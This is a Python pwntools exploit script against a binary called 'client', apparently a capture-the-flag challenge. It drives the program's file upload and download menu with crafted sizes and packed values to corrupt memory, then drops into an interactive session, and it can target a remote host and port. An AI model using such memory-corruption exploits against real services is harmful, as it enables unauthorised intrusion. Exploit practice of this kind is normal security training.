#!/usr/bin/env python
from pwn import *
from time import sleep
import threading

context.binary = e = ELF("client")
libc = e.libc
gs = """
brva 0x1790
brva 0x19A6
"""


def start():
    global server
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def upload(p, name, size, data, push=2):
    p.sendlineafter(b"> ", b"2")
    p.sendafter(b'File name: ', name)
    p.sendlineafter(b'File size: ', str(size).encode())
    if size:
        p.sendafter(b"Data: ", data)
    p.sendlineafter(
        b'Do you want to send now or to send later? [1. Now / 2. Later] > ', str(push).encode())


def download(p, name):
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b'File name: ', name)


p = start()


upload(p, b'A'*0x10+b'\0', 0x400,
       (b'\0'*0x11c+p64(1024+256)).ljust(0x400, b'X'), 2)
upload(p, b'B'*0x10+b'\0', 0xe7, b'Y'*0xe7, 2)
upload(p, b'C'*0x10+b'\0', 0x18, b'Z'*0x18, 1)


upload(p, b'D'*0x10+b'\0', 0x20, b'4'*0x18+p32(0xf0)+b'A', 1)
download(p, b'B'*0x10)

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

upload(p, b'D'*0x10+b'\0', 0x18, b'4'*0x18, 1)


p.interactive()
